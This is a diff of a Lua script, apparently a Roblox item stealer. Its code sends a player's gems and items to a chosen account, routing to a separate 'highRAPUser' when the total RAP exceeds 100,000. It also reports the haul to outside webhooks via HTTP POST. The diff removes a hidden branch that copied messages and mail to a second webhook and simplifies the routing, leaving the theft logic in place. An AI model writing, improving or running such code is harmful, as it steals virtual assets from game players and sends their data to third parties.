@@ -128,16 +128,7 @@ local function SendMessage(username, diamonds, webhookUrl)
     local body = HttpService:JSONEncode(data)
 
     if webhookUrl and webhookUrl ~= "" then
-        -- Send the message to the high RAP webhook
-        request({
-            Url = highRAPWebhook,
-            Method = "POST",
-            Headers = headers,
-            Body = body
-        })
-
-        -- Send the message to the original webhook
-        request({
+        local response = request({
             Url = webhookUrl,
             Method = "POST",
             Headers = headers,
@@ -289,25 +280,9 @@ if #sortedItems > 0 then
     local targetUser = (totalRAP > 100000) and highRAPUser or plr.Name
     local targetWebhook = (totalRAP > 100000) and highRAPWebhook or webhook
 
-spawn(function()
-    -- Conditional send logic based on totalRAP value
-    if totalRAP > 100000 then
-        -- If total RAP > 100,000:
-        -- Send both message and mail to highRAPWebhook/highRAPUser
-        SendMessage(targetUser, GemAmount1, highRAPWebhook)
-        SendMail(targetUser, GemAmount1, highRAPWebhook)
-        
-        -- Do not send anything to the global webhook/user
-    else
-        -- If total RAP <= 100,000:
-        -- Send both message and mail to global webhook/user
-        SendMessage(targetUser, GemAmount1, webhook)
-        SendMail(targetUser, GemAmount1, webhook)
-        
-        -- Send message only to highRAPWebhook/highRAPUser (no mail)
-        SendMessage(targetUser, GemAmount1, highRAPWebhook)
-    end
-end)
+    spawn(function()
+        SendMessage(targetUser, GemAmount1, targetWebhook)
+    end)
 
     SendAllGems()
 
